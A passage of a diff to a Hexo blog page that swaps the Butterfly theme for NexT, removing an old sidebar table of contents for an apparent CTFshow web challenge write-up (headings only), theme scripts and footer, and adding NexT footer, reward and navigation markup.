class="toc-text">web12</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web13"><span class="toc-text">web13</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web14"><span class="toc-text">web14</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web15"><span class="toc-text">web15</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web16"><span class="toc-text">web16</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web17"><span class="toc-text">web17</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web18"><span class="toc-text">web18</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web19"><span class="toc-text">web19</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web20"><span class="toc-text">web20</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%88%86%E7%A0%B4-Complete"><span class="toc-text">爆破(Complete)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web21"><span class="toc-text">web21</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web23"><span class="toc-text">web23</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web24"><span class="toc-text">web24</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web25"><span class="toc-text">web25</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web26"><span class="toc-text">web26</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web27"><span class="toc-text">web27</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web28"><span class="toc-text">web28</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web29"><span class="toc-text">web29</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web30"><span class="toc-text">web30</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web31"><span class="toc-text">web31</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web32"><span class="toc-text">web32</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web33"><span class="toc-text">web33</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web34"><span class="toc-text">web34</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web35"><span class="toc-text">web35</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web36"><span class="toc-text">web36</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web37"><span class="toc-text">web37</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web38"><span class="toc-text">web38</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web39"><span class="toc-text">web39</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web40"><span class="toc-text">web40</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web41"><span class="toc-text">web41</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web42"><span class="toc-text">web42</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web43"><span class="toc-text">web43</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web44"><span class="toc-text">web44</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web56"><span class="toc-text">web56</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web254"><span class="toc-text">web254</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web255"><span class="toc-text">web255</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web256"><span class="toc-text">web256</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web257"><span class="toc-text">web257</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web258"><span class="toc-text">web258</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web259-open"><span class="toc-text">web259(open)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web260"><span class="toc-text">web260</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web261"><span class="toc-text">web261</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web262"><span class="toc-text">web262</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web263"><span class="toc-text">web263</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web264"><span class="toc-text">web264</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web265"><span class="toc-text">web265</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web266"><span class="toc-text">web266</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web267"><span class="toc-text">web267</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web275"><span class="toc-text">web275</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web276"><span class="toc-text">web276</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web277"><span class="toc-text">web277</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web278"><span class="toc-text">web278</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF-Complete"><span class="toc-text">SSRF(Complete)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web351"><span class="toc-text">web351</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web352"><span class="toc-text">web352</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web353"><span class="toc-text">web353</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web354"><span class="toc-text">web354</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web355"><span class="toc-text">web355</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web356"><span class="toc-text">web356</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web357"><span class="toc-text">web357</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web358"><span class="toc-text">web358</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web359"><span class="toc-text">web359</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web360"><span class="toc-text">web360</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-text">权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web670"><span class="toc-text">web670</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/08/02/AyaN0%E6%A1%91%E7%9A%84%E9%9B%86%E8%AE%AD%E9%98%B6%E6%AE%B5%E6%80%BB%E7%BB%93/" title="AyaN0桑的集训阶段总结">AyaN0桑的集训阶段总结</a><time datetime="2025-08-02T05:02:44.000Z" title="发表于 2025-08-02 13:02:44">2025-08-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/14/CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" title="CRLF注入漏洞">CRLF注入漏洞</a><time datetime="2025-07-14T10:47:04.000Z" title="发表于 2025-07-14 18:47:04">2025-07-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/" title="刷题蛆来咯-CTFshow">刷题蛆来咯-CTFshow</a><time datetime="2025-07-07T06:19:38.000Z" title="发表于 2025-07-07 14:19:38">2025-07-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/07/114514%E5%88%86%E9%92%9F%E8%83%BD%E4%BA%86%E8%A7%A3SSRF%E5%90%97/" title="114514分钟能了解SSRF吗">114514分钟能了解SSRF吗</a><time datetime="2025-07-07T05:05:59.000Z" title="发表于 2025-07-07 13:05:59">2025-07-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/01/%E7%A3%A8%E5%A5%BD%E7%9A%84%E5%88%A9%E5%89%91-PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/" title="磨好的利剑:PHP原生类">磨好的利剑:PHP原生类</a><time datetime="2025-07-01T05:58:51.000Z" title="发表于 2025-07-01 13:58:51">2025-07-01</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By AyaN0</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><div class="aplayer no-destroy" data-id="2688080408" data-server="netease" data-type="song" data-fixed="true" data-autoplay="true"> </div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="Venus,Mars,Diana,Minerva,Ceres,Vulcan,Pluto,Vulcan,Juno,Mercury,Vesta,Saturn,Proserpina,Neptune,Jupiter" data-fontsize="15px" data-random="false" async="async"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script>(() => {
-  const destroyAplayer = () => {
-    if (window.aplayers) {
-      for (let i = 0; i < window.aplayers.length; i++) {
-        if (!window.aplayers[i].options.fixed) {
-          window.aplayers[i].destroy()
-        }
-      }
-    }
-  }
+    </div>
 
-  const runMetingJS = () => {
-    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
-  }
+    
+    
+    
 
-  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
-  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
-})()</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
-  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>请我一杯咖啡吧！</div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.jpg" alt="AyaN0 微信">
+        <span>微信</span>
+      </div>
 
-  window.pjax = new Pjax({
-    elements: 'a:not([target="_blank"])',
-    selectors: pjaxSelectors,
-    cacheBust: false,
-    analytics: false,
-    scrollRestoration: false
-  })
+  </div>
+</div>
 
-  const triggerPjaxFn = (val) => {
-    if (!val) return
-    Object.values(val).forEach(fn => fn())
-  }
+          <div class="post-tags">
+              <a href="/tags/Web-CTF-WriteUp/" rel="tag"># -Web -CTF -WriteUp</a>
+          </div>
 
-  document.addEventListener('pjax:send', () => {
-    // removeEventListener
-    btf.removeGlobalFnEvent('pjaxSendOnce')
-    btf.removeGlobalFnEvent('themeChange')
+        
 
-    // reset readmode
-    const $bodyClassList = document.body.classList
-    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/07/07/114514%E5%88%86%E9%92%9F%E8%83%BD%E4%BA%86%E8%A7%A3SSRF%E5%90%97/" rel="prev" title="114514分钟能了解SSRF吗">
+                  <i class="fa fa-angle-left"></i> 114514分钟能了解SSRF吗
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/07/14/CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" rel="next" title="CRLF注入漏洞">
+                  CRLF注入漏洞 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
 
-    triggerPjaxFn(window.globalFn.pjaxSend)
-  })
 
-  document.addEventListener('pjax:complete', () => {
-    btf.removeGlobalFnEvent('pjaxCompleteOnce')
-    document.querySelectorAll('script[data-pjax]').forEach(item => {
-      const newScript = document.createElement('script')
-      const content = item.text || item.textContent || item.innerHTML || ""
-      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
-      newScript.appendChild(document.createTextNode(content))
-      item.parentNode.replaceChild(newScript, item)
-    })
 
-    triggerPjaxFn(window.globalFn.pjaxComplete)
-  })
 
-  document.addEventListener('pjax:error', e => {
-    if (e.request.status === 404) {
-      pjax.loadUrl('/404')
-    }
-  })
-})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">AyaN0</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">314k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">9:31</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
